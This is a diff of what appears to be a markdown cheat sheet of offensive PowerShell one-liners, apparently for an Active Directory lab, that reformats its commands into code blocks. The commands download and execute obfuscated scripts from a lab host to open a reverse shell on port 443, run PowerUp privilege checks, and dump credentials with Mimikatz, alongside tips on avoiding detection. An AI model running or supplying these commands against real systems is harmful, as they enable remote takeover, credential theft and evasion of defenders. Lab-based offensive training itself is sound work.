@@ -32,7 +32,9 @@ disabling RTM is for noobs
 These only work on PowerShell 3.0. Don't downgrade to 2.0 you will instantly get caught
 
 - Reverse Shell
-`iex (iwr http://172.16.100.X/Invoke-PowerShellTcp-OBFS.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443`
+```
+iex (iwr http://172.16.100.X/Invoke-PowerShellTcp-OBFS.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443
+```
 
 - Load `InvisiShell`
 ```
@@ -48,7 +50,9 @@ iex (iwr http://172.16.100.X/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks;
 ```
 
 - Dump Creds
-`iex (iwr http://172.16.100.X/Invoke-Mimikatz-OBFS.ps1 -UseBasicParsing); Invoke-Mimikatz -DumpCreds;`
+```
+iex (iwr http://172.16.100.X/Invoke-Mimikatz-OBFS.ps1 -UseBasicParsing); Invoke-Mimikatz -DumpCreds;
+```
 
 - Active Directory
 ```
